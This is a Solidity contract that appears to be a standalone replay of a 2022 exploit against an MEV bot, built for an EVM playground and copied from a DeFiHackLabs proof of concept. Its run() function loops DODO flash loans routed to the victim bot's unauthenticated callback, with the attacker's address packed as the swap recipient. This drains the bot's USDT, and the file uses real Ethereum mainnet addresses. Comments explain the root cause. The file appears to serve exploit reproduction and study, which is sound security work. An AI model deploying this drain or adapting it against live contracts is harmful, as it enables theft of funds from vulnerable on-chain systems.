// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-12-MEVbot_0x28d9).
//
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// `ContractTest` (attacker = address(this)): there is no standalone exploit
// contract — the whole drain is a `while` loop of `DODO.flashLoan(...)` calls
// whose `assetTo` points at the victim MEV bot and whose `data` encodes
// `address(this)` as the swap-output recipient. This self-contained contract
// faithfully copies that inline attack so the playground can deploy it and
// record `run()`. Logic and constants are copied verbatim from
// test/MEVbot_0x28d9_exp.sol.
//
// Root cause: the victim MEV bot (0x28d9, unverified) implements DODO's
// `DSPFlashLoanCall` callback and performs its OWN arbitrage inside it without
// authenticating `sender` and without validating where the swap output is sent.
// The attacker passes the victim as `assetTo` and packs its own address into
// `data`, so the DODO pool calls the victim's callback with attacker-controlled
// `data`: the victim dutifully swaps the flash-loaned USDT into USDC via the
// pool and TRANSFERS THAT USDC TO THE ATTACKER, then repays the loan from its
// OWN treasury. Each round the victim loses ~16.78M µUSDT; the loop repeats
// 159 times then sweeps the remainder, draining the bot's entire balance.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface IDPPAdvanced {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

contract MEVbot28d9Drain {
    // Ethereum mainnet token / pool constants — copied verbatim from the test.
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant DODO = 0x3058EF90929cb8180174D74C507176ccA6835D73;
    address constant MEVBOT = 0x28d949Fdfb5d9ea6B604fA6FEe3D6548ea779F17;

    // Borrowed per full round — 2^24 µUSDT (gas-friendly chunk the attacker used).
    uint256 constant ROUND = 16_777_120;

    // The attack — drain the MEV bot's USDT treasury via repeated DODO flash
    // loans routed to the victim's unguarded callback.
    function run() public {
        // data = (recipient, minReturn, 0, 0). The victim decodes `recipient` from
        // the first field and sends its swap output there; we set it to this
        // contract so profit stays in-contract (scored via profitReceiver: "exploit").
        // minReturn = ROUND * 110 / 100 is a generous slippage bound the 1:1 pool
        // always satisfies — never the binding constraint.
        bytes memory data = abi.encode(address(this), ROUND * 110 / 100, 0, 0);

        // Full rounds while the bot still holds > 20 USDT.
        while (IERC20(USDT).balanceOf(MEVBOT) > 20 * 1e6) {
            IDPPAdvanced(DODO).flashLoan(0, ROUND, MEVBOT, data);
        }
        // Final sweep of the bot's remaining USDT balance.
        IDPPAdvanced(DODO).flashLoan(0, IERC20(USDT).balanceOf(MEVBOT), MEVBOT, data);
    }

    // The victim bot calls back into the flash-loan initiator (us) with an internal
    // notification selector after its swap. The original Foundry test swallows it
    // via `fallback()`/`receive()`; we do the same so the round does not revert.
    fallback() external payable {}
    receive() external payable {}
}
